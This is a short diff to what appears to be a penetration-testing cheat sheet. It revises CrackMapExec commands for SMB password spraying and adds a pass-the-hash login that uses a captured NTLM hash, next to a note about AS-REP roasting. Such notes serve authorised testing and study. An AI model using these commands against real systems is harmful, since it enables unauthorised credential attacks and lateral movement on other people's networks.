@@ -115,5 +115,7 @@ For attack need to know username and flag 'do not require preauth'
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## CRACKMAPEXEC
 
-1) SMB SHARE PASSWORD SPRAYING: crackmapexec smb [IP] -u username -p password --no-bruteforce
+1) SMB SHARE PASSWORD SPRAYING: crackmapexec smb [IP] -u username -p password -d [domain] --no-bruteforce
+2) PASS THE HASH: crackmapexec smb [IP] -u username -H [hash] //--local: local account
+
 
